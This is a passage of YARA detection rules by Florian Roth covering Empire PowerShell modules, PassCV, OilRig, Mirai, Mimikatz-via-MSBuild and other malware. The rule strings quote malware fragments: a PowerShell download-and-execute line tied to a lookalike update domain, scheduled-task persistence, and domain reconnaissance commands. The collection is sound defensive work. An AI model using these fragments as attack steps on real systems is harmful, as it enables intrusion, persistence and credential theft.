      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1021, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$Base64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA" ascii
      $s2 = "Invoke-SSHCommand -ip 192.168.1.100 -Username root -Password test -Command \"id\"" fullword ascii
      $s3 = "Write-Verbose \"[*] Error loading dll\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x660a and filesize < 2000KB and 1 of them ) or all of them
} 

rule Empire_PowerUp_Gen_RID2E1D : DEMO FILE GEN SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - from files PowerUp.ps1, PowerUp.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 11:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, GEN, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$Result = sc.exe config $($TargetService.Name) binPath= $OriginalPath" fullword ascii
      $s2 = "$Result = sc.exe pause $($TargetService.Name)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x233c and filesize < 2000KB and 1 of them ) or all of them
} 

rule Empire_Agent_Gen_RID2D3A : DEMO FILE GEN SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - from files agent.ps1, agent.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 10:22:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, GEN, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$wc.Headers.Add(\"User-Agent\",$script:UserAgent)" fullword ascii
      $s2 = "$min = [int]((1-$script:AgentJitter)*$script:AgentDelay)" fullword ascii
      $s3 = "if ($script:AgentDelay -ne 0){" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x660a and filesize < 100KB and 1 of them ) or all of them
} 

rule Empire_Invoke_InveighRelay_Gen_RID32DD : DEMO FILE GEN SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - from files Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 14:23:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, GEN, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$inveigh.SMBRelay_failed_list.Add(\"$HTTP_NTLM_domain_string\\$HTTP_NTLM_user_string $SMBRelayTarget\")" fullword ascii
      $s2 = "$NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 200KB and 1 of them ) or all of them
} 

rule Empire_KeePassConfig_Gen_RID304D : DEMO FILE GEN SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - from files KeePassConfig.ps1, KeePassConfig.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, GEN, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7223 and filesize < 80KB and 1 of them ) or all of them
} 

rule Empire_Invoke_Portscan_Gen_RID3160 : DEMO FILE GEN SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - from files Invoke-Portscan.ps1, Invoke-Portscan.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 13:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, GEN, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Test-Port -h $h -p $Port -timeout $Timeout" fullword ascii
      $s2 = "1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 100KB and 1 of them ) or all of them
} 

rule Empire_Invoke_Gen_RID2DB7 : DEMO FILE GEN SCRIPT T1055 T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - from files Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 10:43:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, GEN, SCRIPT, T1055, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$Shellcode1 += 0x48" fullword ascii
      $s2 = "$PEHandle = [IntPtr]::Zero" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 3000KB and 1 of them ) or all of them
} 

rule Empire_PowerShell_Framework_Gen5_RID3392 : DEMO FILE SCRIPT T1003 T1055 T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 14:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1003, T1055, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if ($ExeArgs -ne $null -and $ExeArgs -ne '')" fullword ascii
      $s2 = "$ExeArgs = \"ReflectiveExe $ExeArgs\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 1000KB and 1 of them ) or all of them
} 

rule PassCV_Sabre_Malware_1_RID2F45 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "PassCV Malware mentioned in Cylance Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies"
      date = "2016-10-20 11:50:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "F:\\Excalibur\\Excalibur\\Excalibur\\" ascii
      $x2 = "bin\\oSaberSvc.pdb" ascii
      $s1 = "cmd.exe /c MD " fullword ascii
      $s2 = "https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=0&rsv_idx=1&tn=baidu&wd=ip138" fullword wide
      $s3 = "CloudRun.exe" fullword wide
      $s4 = "SaberSvcB.exe" fullword wide
      $s5 = "SaberSvc.exe" fullword wide
      $s6 = "SaberSvcW.exe" fullword wide
      $s7 = "tianshiyed@iaomaomark1#23mark123tokenmarkqwebjiuga664115" fullword wide
      $s8 = "Internet Connect Failed!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) and 5 of ( $s* ) ) ) or ( all of them )
} 

rule PassCV_Sabre_Malware_Signing_Cert_RID33D0 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "PassCV Malware mentioned in Cylance Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies"
      date = "2016-10-20 15:03:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "WOODTALE TECHNOLOGY INC" ascii
      $s2 = "Flyingbird Technology Limited" ascii
      $s3 = "Neoact Co., Ltd." ascii
      $s4 = "AmazGame Age Internet Technology Co., Ltd" ascii
      $s5 = "EMG Technology Limited" ascii
      $s6 = "Zemi Interactive Co., Ltd" ascii
      $s7 = "337 Technology Limited" ascii
      $s8 = "Runewaker Entertainment0" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them )
} 

rule PassCV_Sabre_Malware_2_RID2F46 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "PassCV Malware mentioned in Cylance Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies"
      date = "2016-10-20 11:50:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ncProxyXll" fullword ascii
      $s1 = "Uniscribe.dll" fullword ascii
      $s2 = "WS2_32.dll" ascii
      $s3 = "ProxyDll" fullword ascii
      $s4 = "JDNSAPI.dll" fullword ascii
      $s5 = "x64.dat" fullword ascii
      $s6 = "LSpyb2" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and $x1 ) or ( all of them )
} 

rule PassCV_Sabre_Malware_Excalibur_1_RID3343 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "PassCV Malware mentioned in Cylance Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies"
      date = "2016-10-20 14:40:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "F:\\Excalibur\\Excalibur\\" ascii
      $x2 = "Excalibur\\bin\\Shell.pdb" ascii
      $x3 = "SaberSvc.exe" wide
      $s1 = "BBB.exe" fullword wide
      $s2 = "AAA.exe" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of ( $x* ) or all of ( $s* ) ) or 3 of them
} 

rule PassCV_Sabre_Malware_3_RID2F47 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "PassCV Malware mentioned in Cylance Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies"
      date = "2016-10-20 11:50:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "NXKILL" fullword wide
      $s1 = "2OLE32.DLL" fullword ascii
      $s2 = "localspn.dll" fullword wide
      $s3 = "!This is a Win32 program." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and $x1 and 2 of ( $s* ) )
} 

rule PassCV_Sabre_Malware_4_RID2F48 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "PassCV Malware mentioned in Cylance Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies"
      date = "2016-10-20 11:50:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "QWNjZXB0On" fullword ascii
      $s2 = "VXNlci1BZ2VudDogT" fullword ascii
      $s3 = "dGFzay5kbnME3luLmN" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
} 

rule PassCV_Sabre_Tool_NTScan_RID3010 : APT DEMO EXE FILE T1077 T1136 {
   meta:
      description = "PassCV Malware mentioned in Cylance Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies"
      date = "2016-10-20 12:23:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1077, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "NTscan.EXE" fullword wide
      $x2 = "NTscan Microsoft " fullword wide
      $s1 = "admin$" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them )
} 

rule PassCV_Sabre_Malware_5_RID2F49 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "PassCV Malware mentioned in Cylance Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies"
      date = "2016-10-20 11:50:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ncircTMPg" fullword ascii
      $x2 = "~SHELL#" fullword ascii
      $x3 = "N.adobe.xm" fullword ascii
      $s1 = "NEL32.DLL" fullword ascii
      $s2 = "BitLocker.exe" fullword wide
      $s3 = "|xtplhd" fullword ascii
      $s4 = "SERVICECORE" fullword wide
      $s5 = "SHARECONTROL" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 1 of ( $x* ) or all of ( $s* ) )
} 

rule OilRig_Malware_Campaign_Gen1_RID31A8 : DEMO FILE G0049 MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects Oilrig malware samples"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12 13:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, G0049, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Get-Content $env:Public\\Libraries\\update.vbs) -replace" ascii
      $x2 = "wss.Run \"powershell.exe \" & Chr(34) & \"& {waitfor haha /T 2}\" & Chr(34), 0" fullword ascii
      $x3 = "Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\"%PUBLIC%\") & \"\\Libraries\\update.vbs\")" fullword ascii
      $s4 = "CreateObject(\"WScript.Shell\").Run cmd, 0o" fullword ascii
      $b1 = "JGdsb2JhbDpteWhvc3QgP" ascii
      $b2 = "SE9NRT0iJXB1YmxpYyVcTGlicmFyaWVzX" ascii
      $b3 = "U2V0IHdzcyA9IENyZWF0ZU9iamVjdCgid1NjcmlwdC5TaGV" ascii
      $b4 = "JHNjcmlwdGRpciA9IFNwbGl0LVBhdGggLVBhcmVudCAtUGF0aCA" ascii
      $b5 = "DQpTZXQgd3NzID0gQ3JlYXRlT2JqZWN" ascii
      $b6 = "d2hvYW1pICYgaG9zdG5hb" ascii
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and filesize < 700KB and 1 of them )
} 

rule OilRig_Malware_Campaign_Mal1_RID31A8 : DEMO FILE G0049 MAL MIDDLE_EAST T1105 T1136 {
   meta:
      description = "Detects Oilrig malware samples"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12 13:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, G0049, MAL, MIDDLE_EAST, T1105, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "DownloadExecute=\"powershell \"\"&{$r=Get-Random;$wc=(new-object System.Net.WebClient);$wc.DownloadFile(" ascii
      $x2 = "-ExecutionPolicy Bypass -File \"&HOME&\"dns.ps1\"" fullword ascii
      $x3 = "CreateObject(\"WScript.Shell\").Run Replace(DownloadExecute,\"-_\",\"bat\")" fullword ascii
      $x4 = "CreateObject(\"WScript.Shell\").Run DnsCmd,0" fullword ascii
      $s1 = "http://winodwsupdates.me" ascii
   condition: 
      ( uint16 ( 0 ) == 0x4f48 and filesize < 4KB and 1 of them ) or ( 2 of them )
} 

rule OilRig_Malware_Campaign_Gen2_RID31A9 : DEMO FILE G0049 MAL MIDDLE_EAST T1053 T1136 {
   meta:
      description = "Detects Oilrig malware samples"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12 13:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, G0049, MAL, MIDDLE_EAST, T1053, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%userprofile%\\AppData\\Local\\Microsoft\\ " fullword ascii
      $s2 = "$fdn=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" fullword ascii
      $s3 = "&{$rn = Get-Random; $id = 'TR" fullword ascii
      $s4 = "') -replace '__',('DNS'+$id) | " fullword ascii
      $s5 = "\\upd.vbs" fullword ascii
      $s6 = "schtasks /create /F /sc minute /mo " fullword ascii
      $s7 = "') -replace '__',('HTP'+$id) | " fullword ascii
      $s8 = "&{$rn = Get-Random -minimum 1 -maximum 10000; $id = 'AZ" fullword ascii
      $s9 = "http://www.israirairlines.com/?mode=page&page=14635&lang=eng<" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and filesize < 4000KB and 2 of ( $s* ) ) or ( 4 of them )
} 

rule OilRig_Malware_Campaign_Gen3_RID31AA : DEMO FILE G0049 MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects Oilrig malware samples"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12 13:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, G0049, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlrrrr" fullword ascii
      $x2 = "\\Libraries\\fireueye.vbs" fullword ascii
      $x3 = "\\Libraries\\fireeye.vbs&" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and filesize < 100KB and 1 of them )
} 

rule OilRig_Malware_Campaign_Mal2_RID31A9 : DEMO FILE G0049 MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects Oilrig malware samples"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12 13:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, G0049, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "wss.Run \"powershell.exe \" & Chr(34) & \"& {(Get-Content $env:Public\\Libraries\\update.vbs) -replace '__',(Get-Random) | Set-C" ascii
      $x2 = "Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\"%PUBLIC%\") & \"\\Libraries\\update.vbs\")" fullword ascii
      $x3 = "mailto:Mohammed.sarah@gratner.com" fullword wide
      $x4 = "mailto:Tarik.Imam@gartner.com" fullword wide
      $x5 = "Call Extract(DnsPs1, wss.ExpandEnvironmentStrings(\"%PUBLIC%\") & \"\\Libraries\\dns.ps1\")" fullword ascii
      $x6 = "2dy53My5vcmcvMjAw" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and filesize < 200KB and 1 of them )
} 

rule OilRig_Campaign_Reconnaissance_RID32E1 : DEMO G0049 MAL MIDDLE_EAST T1016 T1033 T1087 T1136 {
   meta:
      description = "Detects Oilrig malware samples"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12 14:24:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, G0049, MAL, MIDDLE_EAST, T1016, T1033, T1087, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "whoami & hostname & ipconfig /all" ascii
      $s2 = "net user /domain 2>&1 & net group /domain 2>&1" ascii
      $s3 = "net group \"domain admins\" /domain 2>&1 & " ascii
   condition: 
      ( filesize < 1KB and 1 of them )
} 

rule OilRig_Malware_Campaign_Mal3_RID31AA : DEMO G0049 MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects Oilrig malware samples"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12 13:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, G0049, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "(Get-Content $env:Public\\Libraries\\dns.ps1) -replace ('#'+'##'),$botid | Set-Content $env:Public\\Libraries\\dns.ps1" fullword ascii
      $x2 = "Invoke-Expression ($global:myhome+'tp\\'+$global:filename+'.bat > '+$global:myhome+'tp\\'+$global:filename+'.txt')" fullword ascii
      $x3 = "('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))" fullword ascii
   condition: 
      ( filesize < 10KB and 1 of them )
} 

rule Sality_Malware_Oct16_RID2E9B : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects an unspecififed malware - October 2016"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 11:21:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Hello world!" fullword wide
      $s2 = "[LordPE]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule Unspecified_Malware_Oct16_C_RID3136 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects an unspecififed malware - October 2016"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 13:12:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "dUSER32.DLL" fullword wide
      $s2 = "output.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them )
} 

rule Unspecified_Malware_Oct16_E_RID3138 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects unspecified Malware - October 2016"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 13:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "P3pORt" fullword ascii
      $s2 = "msdownld.tmp" fullword ascii
      $s3 = "TMP4351$.TMP" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule Unspecified_Malware_Oct16_A_RID3134 : DEMO EXE FILE MAL T1136 T1183 {
   meta:
      description = "Detects an unspecififed malware - October 2016"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 13:12:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136, T1183"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%s\\system32\\%s.dll" fullword ascii
      $x2 = "%SystemRoot%\\System32\\svch%s -k nets" fullword ascii
      $x3 = "\\\\.\\pipe\\96DBA249-E88E-4c47-98DC-E18E6E3E3E5A" fullword ascii
      $s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" fullword ascii
      $s2 = "boottemp.exe" fullword ascii
      $s3 = "at \\\\%s %d:%d C:\\%s.exe" fullword ascii
      $s4 = "cryptcom.dll" fullword ascii
      $s5 = "Wininet.dll" fullword ascii
      $s6 = "\\\\%s\\%s\\%s.exe" fullword ascii
      $s7 = "%s%d.exe" fullword ascii
      $s8 = "booter.exe" fullword ascii
      $s9 = "\\\\%s\\pipe%s" fullword ascii
      $s10 = "C:\\DelInfo.bin" fullword ascii
      $op0 = { ae 44 00 00 cb 44 00 00 dc 44 00 00 f5 44 00 00 } 
      $op1 = { ae 44 00 00 cb 44 00 00 dc 44 00 00 f5 44 00 00 } 
      $op2 = { ee 11 74 cf 73 0b 91 c4 c9 57 b2 d9 36 86 a5 b4 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 2 of ( $x* ) or 3 of ( $s* ) or all of ( $op* ) ) ) or ( 6 of them )
} 

rule Bladabindi_Malware_B64_RID2F1E : DEMO EXE FILE MAL T1132 T1136 {
   meta:
      description = "Detects Bladabindi Malware using Base64 encoded strings"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 11:43:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1132, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "XHN5c3RlbTMyXA==" fullword ascii
      $s2 = "RXhlY3V0ZSBFUlJPUg==" fullword ascii
      $s3 = "dHJvamFuLmV4ZQ==" fullword ascii
      $s4 = "VXBkYXRlIEVSUk9S" fullword ascii
      $s5 = "RG93bmxvYWQgRVJST1I=" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them
} 

rule Dorkbot_Injector_Malware_RID30AB : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Darkbot Injector"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 12:49:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Enter an integer, a real number, a character and a string : " fullword ascii
      $s2 = "ready to finish" fullword ascii
      $s3 = "EYEnpw" fullword ascii
      $s4 = "somewhere i belong" fullword ascii
      $s5 = "Not all fields were assigned" fullword ascii
      $s6 = "take down" fullword ascii
      $s7 = "real number = %f" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 6 of them )
} 

rule Unspecified_Malware_Oct16_D_RID3137 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects unspecified malware - October 2016"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-08 13:13:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\file.exe" fullword wide
      $s2 = "new.exe" fullword wide
      $s3 = "passwordIterations" fullword ascii
      $op0 = { 10 00 12 00 1a 00 05 00 01 00 01 00 01 00 10 00 } 
      $op1 = { 41 32 00 36 00 62 00 34 00 32 00 65 00 37 00 62 } 
      $op2 = { 3c 4d 6f 64 75 6c 65 3e 00 6e 65 77 2e 65 78 65 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( all of ( $s* ) or all of ( $op* ) )
} 

rule MSBuild_Mimikatz_Execution_via_XML_RID3448 : DEMO S0002 SUSP T1003 T1075 T1097 T1127 T1136 T1178 {
   meta:
      description = "Detects an XML that executes Mimikatz on an endpoint via MSBuild"
      author = "Florian Roth"
      reference = "https://gist.github.com/subTee/c98f7d005683e616560bda3286b6a0d8#file-katz-xml"
      date = "2016-10-07 15:23:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, S0002, SUSP, T1003, T1075, T1097, T1127, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "<Project ToolsVersion=" ascii
      $x2 = "</SharpLauncher>" fullword ascii
      $s1 = "\"TVqQAAMAAAA" ascii
      $s2 = "System.Convert.FromBase64String(" ascii
      $s3 = ".Invoke(" ascii
      $s4 = "Assembly.Load(" ascii
      $s5 = ".CreateInstance(" ascii
   condition: 
      all of them
} 

rule Mirai_Botnet_Malware_RID2EF6 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Mirai Botnet Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-04 11:36:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "POST /cdn-cgi/" fullword ascii
      $x2 = "/dev/misc/watchdog" fullword ascii
      $x3 = "/dev/watchdog" ascii
      $x4 = "\\POST /cdn-cgi/" fullword ascii
      $x5 = ".mdebug.abi32" fullword ascii
      $s1 = "LCOGQGPTGP" fullword ascii
      $s2 = "QUKLEKLUKVJOG" fullword ascii
      $s3 = "CFOKLKQVPCVMP" fullword ascii
      $s4 = "QWRGPTKQMP" fullword ascii
      $s5 = "HWCLVGAJ" fullword ascii
      $s6 = "NKQVGLKLE" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 200KB and ( ( 1 of ( $x* ) and 1 of ( $s* ) ) or 4 of ( $s* ) )
} 

rule Nishang_Webshell_RID2D6E : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a ASPX web shell"
      author = "Florian Roth"
      reference = "https://github.com/samratashok/nishang"
      date = "2016-09-11 10:31:31"
      score = 75
      customer = "demo"
